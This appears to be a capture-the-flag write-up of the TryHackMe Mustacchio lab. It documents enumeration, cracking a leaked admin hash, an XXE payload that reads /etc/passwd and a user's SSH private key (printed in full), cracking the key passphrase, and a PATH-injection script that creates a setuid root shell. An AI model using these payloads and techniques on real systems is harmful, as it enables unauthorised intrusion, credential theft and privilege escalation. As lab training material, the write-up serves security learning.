/home/sami/Documents/THM/CTFs/Neighbour# Enumeration
## ping
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ ping 10.10.169.216
PING 10.10.169.216 (10.10.169.216) 56(84) bytes of data.
64 bytes from 10.10.169.216: icmp_seq=1 ttl=63 time=94.4 ms
64 bytes from 10.10.169.216: icmp_seq=2 ttl=63 time=100 ms
64 bytes from 10.10.169.216: icmp_seq=3 ttl=63 time=96.7 ms
^C
--- 10.10.169.216 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 94.407/97.194/100.433/2.480 ms
```
## port scan with [[nmap]]
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ sudo nmap -A -p- -oN nmap_results.txt 10.10.169.216
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-09 23:13 EET
Nmap scan report for 10.10.169.216
Host is up (0.071s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 581b0c0ffacf05be4cc07af1f188611c (RSA)
|   256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA)
|_  256 9d59c6c779c554c41daae4d184710192 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Android 4.1.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   70.86 ms 10.11.0.1
2   71.12 ms 10.10.169.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.59 seconds
```
### Notes:
- ssh is open on port 22
- http is open on port 80
- nginx is open on port 8765
## http://mustacchio.thm/
![[Pasted image 20221109233424.png]]
```html
<!doctype html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Mustacchio | Home</title>
	<link rel="stylesheet" type="text/css" href="[custom/css/style.css](view-source:http://10.10.169.216/custom/css/style.css)">
	<link rel="stylesheet" type="text/css" href="[custom/css/mobile.css](view-source:http://10.10.169.216/custom/css/mobile.css)" media="screen and (max-width : 568px)">
	<script type="text/javascript" src="[custom/js/mobile.js](view-source:http://10.10.169.216/custom/js/mobile.js)"></script>
</head>
<body>
	<div id="header">
		<a href="[index.html](view-source:http://10.10.169.216/index.html)" class="logo">
			<img src="[images/logo.jpg](view-source:http://10.10.169.216/images/logo.jpg)" alt="">
		</a>
		<ul id="navigation">
			<li class="selected">
				<a href="[index.html](view-source:http://10.10.169.216/index.html)">home</a>
			</li>
			<li>
				<a href="[about.html](view-source:http://10.10.169.216/about.html)">about</a>
			</li>
			<li>
				<a href="[gallery.html](view-source:http://10.10.169.216/gallery.html)">gallery</a>
			</li>
			<li>
				<a href="[blog.html](view-source:http://10.10.169.216/blog.html)">blog</a>
			</li>
			<li>
				<a href="[contact.html](view-source:http://10.10.169.216/contact.html)">contact</a>
			</li>
		</ul>
	</div>
	<div id="body">
		<div id="featured">
			<img src="[images/the-beacon.jpg](view-source:http://10.10.169.216/images/the-beacon.jpg)" alt="">
			<div>
				<h2>the beacon to all mankind</h2>
				<span>Our website templates are created with</span>
				<span>inspiration, checked for quality and originality</span>
				<span>and meticulously sliced and coded.</span>
				<a href="[blog-single-post.html](view-source:http://10.10.169.216/blog-single-post.html)" class="more">read more</a>
			</div>
		</div>
		<ul>
			<li>
				<a href="[gallery.html](view-source:http://10.10.169.216/gallery.html)">
					<img src="[images/the-father.jpg](view-source:http://10.10.169.216/images/the-father.jpg)" alt="">
					<span>the father</span>
				</a>
			</li>
			<li>
				<a href="[gallery.html](view-source:http://10.10.169.216/gallery.html)">
					<img src="[images/the-actor.jpg](view-source:http://10.10.169.216/images/the-actor.jpg)" alt="">
					<span>the actor</span>
				</a>
			</li>
			<li>
				<a href="[gallery.html](view-source:http://10.10.169.216/gallery.html)">
					<img src="[images/the-nerd.jpg](view-source:http://10.10.169.216/images/the-nerd.jpg)" alt="">
					<span>the nerd</span>
				</a>
			</li>
		</ul>
	</div>
	<div id="footer">
		<div>
			<p>&copy; 2023 by Mustacchio. All rights reserved.</p>
		</div>
	</div>
</body>
</html>
```
### Notes: shown directories
- /index.html
- /about.html
- /gallery.html
- /blog.html
- /contact.html
## dir enum http://mustacchio.thm/ with [[gobuster]]
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ gobuster dir -u http://mustacchio.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_big.txt -x txt,php,html,js -t 20                   
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htaccess.js         (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.js         (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/about.html           (Status: 200) [Size: 3152]
/blog.html            (Status: 200) [Size: 3172]
/contact.html         (Status: 200) [Size: 1450]
/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/]
/gallery.html         (Status: 200) [Size: 1950]
/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
/index.html           (Status: 200) [Size: 1752]
/robots.txt           (Status: 200) [Size: 28]
/robots.txt           (Status: 200) [Size: 28]
/server-status        (Status: 403) [Size: 279]
```
### Notes:
- /robots.txt shows nothing interesting
- /custom
	- http://mustacchio.thm/custom/js/
		- users.bak	2021-06-12 15:48 	8.0K I've downloaded this file
## users.bak check with [[sqlite3]]
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ file users.bak      
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
sami@bt:~/Documents/THM/CTFs/Mustacchio$ sqlite3          
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open users.bak
sqlite> .databases
main: /home/sami/Documents/THM/CTFs/Mustacchio/users.bak r/w
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
COMMIT;
sqlite> 
```
### Notes: 
- Using the help I was able to determine the proper option to dump the database content.
- Obtained user: admin, hash: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
## hashid
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ hashid '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
```
## offline password cracking with [[hashcat]]
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > hash.txt
sami@bt:~/Documents/THM/CTFs/Mustacchio$ hashcat -a 0 -m 100 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -o hashcat_results.txt 
hashcat (v6.2.6) starting
...
Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Time.Started.....: Thu Nov 10 00:08:54 2022 (1 sec)
Time.Estimated...: Thu Nov 10 00:08:55 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 19048.1 kH/s (4.93ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1310720/14344384 (9.14%)
Rejected.........: 0/1310720 (0.00%)
Restore.Point....: 655360/14344384 (4.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: grass4 -> saytown
Hardware.Mon.#1..: Temp: 43c Fan:  0% Util: 42% Core:1746MHz Mem:3898MHz Bus:2

Started: Thu Nov 10 00:08:49 2022
Stopped: Thu Nov 10 00:08:55 2022

sami@bt:~/Documents/THM/CTFs/Mustacchio$ cat hashcat_results.txt 
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```
### Notes:
- Obtained credentials: User: `admin` Password: `XXXX`
## http://mustacchio.thm:8765/
![[Pasted image 20221109233519.png]]
### Notes:
- Admin login page 
- Testing the default credentials U: `admin` P: `admin` , didn't work.
- Testing the obtained credentials U: `admin` P: `XXXXX`.
	- Gained access!
![[Pasted image 20221110001233.png]]
## http://mustacchio.thm:8765/home.php
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mustacchio | Admin Page</title>
    <link href="[https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css](view-source:https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css)" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="stylesheet" href="[assets/css/home.css](view-source:http://mustacchio.thm:8765/assets/css/home.css)">
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->

    <img id="folhas" src="[assets/imgs/pexels-alexander-tiupa-192136.jpg](view-source:http://mustacchio.thm:8765/assets/imgs/pexels-alexander-tiupa-192136.jpg)" alt="">

    <nav class="position-fixed top-0 w-100 m-auto ">
        <ul class="d-flex flex-row align-items-center justify-content-between h-100">
            <li>AdminPanel</li>
            <li class="mt-auto mb-auto"><a href="[auth/logout.php](view-source:http://mustacchio.thm:8765/auth/logout.php)">Logout</a></li>
        </ul>
    </nav>

    <section id="add-comment" class="container-fluid d-flex flex-column align-items-center justify-content-center">
        <h3>Add a comment on the website.</h3>

        <form action="[](view-source:http://mustacchio.thm:8765/home.php)" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
        <h3>Comment Preview:</h3><p>Name: </p><p>Author : </p><p>Comment :<br> <p/>    </section>

<script src="[https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js](view-source:https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js)" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</body>
</html>
```
### Notes:
- comment `<!-- Barry, you can now SSH in using your key!-->` gives us a username: barry and a hint to ssh private key.
- comment `//document.cookie = "Example=/auth/dontforget.bak";`
- checking `dontforget.bak`:
```xml
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had
 not typed this you and I could’ve done something more productive than reading this mi
ndlessly and carelessly as if you did not have anything else to do in life. Life is so
 precious because it is short and you are being so careless that you do not realize it
 until now since this void paragraph mentions that you are doing something so mindless
, so stupid, so careless that you realize that you are not using your time wisely. You
 could’ve been playing with your dog, or eating your cat, but no. You want to read thi
s barren paragraph and expect something marvelous and terrific at the end. But since y
ou still do not realize that you are wasting precious time, you still continue to read
 the null paragraph. If you had not noticed, you have wasted an estimated time of 20 s
econds.</com>
</comment>
```
### Notes:
- This is an example of a proper request to the webapp
- Usernames: Joe - Barry 
- Surnames: Hamd - Clad
## http://mustacchio.thm:8765/home.php
![[Pasted image 20221110002245.png]]
### Notes:
- Probable XXE vulnerability 
## testing XXE vulnerability from the webapp itself
### Payload n.1:
```xml
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```
### Payload n.2:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
### Notes:
- Didn't work
## testing XXE vulnerability using [[BurpSuite]] Repeater
![[Pasted image 20221110113856.png]]
### Notes
- A regular XML payload didn't work with the webapp
- Testing a more sophisticated payload using the example above as a template
![[Pasted image 20221110114129.png]]
### Notes:
- The example is working properly, we can now form our XML payload.
## Testing the customized [[XML payloads]]:
```xml url encoded the places that are not predefined
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>%26xxe%3b</com>
</comment>
```
![[Pasted image 20221110121050.png]]
### Notes:
- LFI has been obtained
- User: `joe:x:1002:1002::/home/joe:/bin/bash`
- User: `barry:x:1003:1003::/home/barry:/bin/bash`
- Getting `Barry` ssh key
- Loading payloads: `sami@bt:/opt/PayloadsAllTheThings/File Inclusion/Intruders$ cat Linux-files.txt | grep ssh`
	- `/home/barry/.ssh/authorized_keys` >> no output
	- `/home/barry/.ssh/id_rsa` >> output obtained
	- ![[Pasted image 20221110122420.png]]
	- `/home/barry/.ssh/id_rsa.keystore`
	- `/home/barry/.ssh/id_rsa.pub`
	- `/home/barry/.ssh/known_hosts`
# Gaining Access to the system
## id_rsa
```id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```
## ssh login
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ nano id_rsa      
sami@bt:~/Documents/THM/CTFs/Mustacchio$ chmod 600 id_rsa
sami@bt:~/Documents/THM/CTFs/Mustacchio$ ssh -i id_rsa barry@10.10.124.171
The authenticity of host '10.10.124.171 (10.10.124.171)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.124.171' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
'^c
sami@bt:~/Documents/THM/CTFs/Mustacchio$ ssh2john id_rsa > rsa_hash.txt
sami@bt:~/Documents/THM/CTFs/Mustacchio$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXX       (id_rsa)     
1g 0:00:00:00 DONE (2022-11-10 12:32) 1.315g/s 3908Kp/s 3908Kc/s 3908KC/s urieljr..urielfabricio
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### Notes:
- password: `XXXXXX`
## ssh login with the obtained creds:
```sh
sami@bt:~/Documents/THM/CTFs/Mustacchio$ ssh -i id_rsa barry@10.10.124.171
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ ls
user.txt
```
# Privileges Escalation
```sh
barry@mustacchio:/home/joe$ ls -hla
total 28K
drwxr-xr-x 2 joe  joe  4.0K Jun 12  2021 .
drwxr-xr-x 4 root root 4.0K Jun 12  2021 ..
-rwsr-xr-x 1 root root  17K Jun 12  2021 live_log
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:/home/joe$ strings live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log ##### absolute path is not specified 
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
barry@mustacchio:/home/joe$ 
```
### Notes:
- `tail -f /var/log/nginx/access.log`  **absolute path is not specified**
## [[Path injection vulnerability]]
```sh
barry@mustacchio:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/tmp$ cat tail 
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
barry@mustacchio:/tmp$ chmod +x /tmp/tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ /home/joe/live_log
barry@mustacchio:/tmp$ ls -hla
total 1.1M
drwxrwxrwt  7 root  root   4.0K Nov 10 11:32 .
drwxr-xr-x 24 root  root   4.0K Nov 10 09:15 ..
-rwsr-sr-x  1 root  root  1014K Nov 10 10:56 bash
drwxrwxrwt  2 root  root   4.0K Nov 10 09:14 .font-unix
drwxrwxrwt  2 root  root   4.0K Nov 10 09:14 .ICE-unix
-rwxrwxr-x  1 barry barry    54 Nov 10 11:29 tail
drwxrwxrwt  2 root  root   4.0K Nov 10 09:14 .Test-unix
drwxrwxrwt  2 root  root   4.0K Nov 10 09:14 .X11-unix
drwxrwxrwt  2 root  root   4.0K Nov 10 09:14 .XIM-unix
barry@mustacchio:/tmp$ ./bash -p
bash-4.3# whoami
root
bash-4.3# 
```
# Done